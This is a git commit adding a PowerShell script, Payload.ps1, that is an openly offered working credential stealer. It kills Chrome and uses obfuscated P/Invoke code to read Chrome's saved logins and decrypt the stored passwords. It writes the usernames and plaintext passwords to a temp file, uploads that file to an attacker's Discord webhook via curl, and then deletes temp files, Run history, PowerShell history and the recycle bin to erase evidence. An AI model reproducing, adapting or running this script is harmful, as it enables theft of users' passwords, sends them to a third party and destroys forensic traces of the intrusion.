6eda06d050aef942c18d0d3d3276829a11972cbe
wywy1234 <117038118+wywy1234@users.noreply.github.com>
2023-11-29 22:16:21 -0600

    Add files via upload

---
+++ Payload.ps1
@@ -0,0 +1,82 @@
+############################################################################################################################################################
+
+$FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"
+
+#Stage 1 Obtain the credentials from the Chrome browsers User Data folder
+
+#First we Kill Chrome just to be safe
+Stop-Process -Name Chrome
+
+$d=Add-Type -A System.Security
+$p='public static'
+$g=""")]$p extern"
+$i='[DllImport("winsqlite3",EntryPoint="sqlite3_'
+$m="[MarshalAs(UnmanagedType.LP"
+$q='(s,i)'
+$f='(p s,int i)'
+$z=$env:LOCALAPPDATA+'\Google\Chrome\User Data'
+$u=[Security.Cryptography.ProtectedData]
+Add-Type "using System.Runtime.InteropServices;using p=System.IntPtr;$p class W{$($i)open$g p O($($m)Str)]string f,out p d);$($i)prepare16_v2$g p P(p d,$($m)WStr)]string l,int n,out p s,p t);$($i)step$g p S(p s);$($i)column_text16$g p C$f;$($i)column_bytes$g int Y$f;$($i)column_blob$g p L$f;$p string T$f{return Marshal.PtrToStringUni(C$q);}$p byte[] B$f{var r=new byte[Y$q];Marshal.Copy(L$q,r,0,Y$q);return r;}}"
+$s=[W]::O("$z\\Default\\Login Data",[ref]$d)
+$l=@()
+if($host.Version-like"7*"){$b=(gc "$z\\Local State"|ConvertFrom-Json).os_crypt.encrypted_key
+$x=[Security.Cryptography.AesGcm]::New($u::Unprotect([Convert]::FromBase64String($b)[5..($b.length-1)],$n,0))}$_=[W]::P($d,"SELECT*FROM logins WHERE blacklisted_by_user=0",-1,[ref]$s,0)
+for(;!([W]::S($s)%100)){$l+=[W]::T($s,0),[W]::T($s,3)
+$c=[W]::B($s,5)
+try{$e=$u::Unprotect($c,$n,0)}catch{if($x){$k=$c.length
+$e=[byte[]]::new($k-31)
+$x.Decrypt($c[3..14],$c[15..($k-17)],$c[($k-16)..($k-1)],$e)}}$l+=($e|%{[char]$_})-join''}
+#After Decrypting the contents of the files, save them to a file in the temp folder.
+
+echo $l >> $env:TMP\$FileName
+
+######################################################################################################################
+#Stage 3 Upload to discord
+
+function Upload-Discord {
+
+[CmdletBinding()]
+param (
+    [parameter(Position=0,Mandatory=$False)]
+    [string]$file,
+    [parameter(Position=1,Mandatory=$False)]
+    [string]$text 
+)
+
+$hookurl = "$dc"
+
+if (-not ([string]::IsNullOrEmpty($text))){
+Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post};
+
+if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
+}
+
+if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:TMP\$FileName"}
+
+
+######################################################################################################################
+
+#Stage 2 Cleanup Traces
+
+<#
+.NOTES 
+	This is to clean up behind you and remove any evidence to prove you were there
+#>
+
+# Delete contents of Temp folder 
+
+rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
+
+# Delete run box history
+
+reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+
+# Delete powershell history
+
+Remove-Item (Get-PSreadlineOption).HistorySavePath
+
+# Deletes contents of recycle bin
+
+Clear-RecycleBin -Force -ErrorAction SilentlyContinue
+
+exit
